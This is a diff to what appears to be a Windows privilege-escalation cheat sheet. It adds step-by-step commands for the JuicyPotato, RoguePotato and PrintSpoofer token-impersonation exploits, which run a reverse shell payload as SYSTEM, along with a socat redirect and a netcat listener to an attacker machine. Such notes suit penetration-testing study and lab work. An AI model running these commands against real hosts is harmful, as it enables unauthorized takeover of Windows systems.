@@ -336,6 +336,39 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*" | ft TaskName,Task
 .\potato.exe -ip <our ip> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
 ```
 
+## Token Impersonation
+
+### JuicyPotato
+1. check under ```whoami /priv``` that ```SeImpersonationPrivilege``` is available
+2. Run juicypotato, ensure that port ```1337``` is available and the ```-c``` input is the one for the current windows version.
+3. Run this at the windows machine:
+```
+JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {012323-123123-123213}
+```
+
+### RoguePotato (newer, should work on Win10)
+1. Setup socat redirect traffic to port 135 to port 9999 on the vm
+```
+sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.22:9999
+```
+2. Check that your window shell user has ```SeImpersonationPrivilege``` or ```SEAssignTokenPrivilege```
+3. setup netcat to catch system reverse shell.
+4. Run roguepotato exploit
+```
+RoguePotato.exe -r 10.13.47.80 -l 9999 -e "C:\PrivEsc\reverse.exe"
+```
+
+### PrintSpoofer
+1. Must ensure C++ distributor is installed on the Windows comp.
+2 Set up netcat to catch system reverse shell.
+3. Run printspoofer exploit
+```
+PrintSpoofer.exe -i -c "C:\PrivEsc\reverse.exe"
+```
+
+## Port Forwarding
+
+
 ## Kernel Exploit (Last resort)
 ### Tools
 1. Windows Exploit Suggester (wes)
